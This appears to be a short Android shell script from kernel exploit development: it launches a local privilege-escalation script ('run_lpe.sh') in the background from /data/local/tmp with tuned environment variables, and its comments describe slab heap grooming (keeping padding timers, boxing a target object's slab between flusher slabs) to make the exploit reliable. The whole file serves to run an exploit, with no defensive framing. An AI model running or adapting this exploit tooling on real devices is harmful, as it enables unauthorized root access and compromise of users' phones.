#!/system/bin/sh
# run10: minimal pad delete.  PAD_KEEP=4185 keeps every padding timer except
# the 15 that share X's slab, so the only frees before the flusher window are
# those 15: no 120-slab avalanche, no RCU stragglers polluting the signal.
# X's slab is then boxed between the untouched padding block below and the
# flusher slabs above, so its discard (if any) cannot coalesce.
cd /data/local/tmp || exit 1
rm -f ic-run10.log
IC_SLABTRACE=1 \
IC_PAD_SKIP=15 IC_PAD_KEEP=4185 IC_FLUSH_DEL=16 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=1 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run10.log 2>&1 &
exit 0
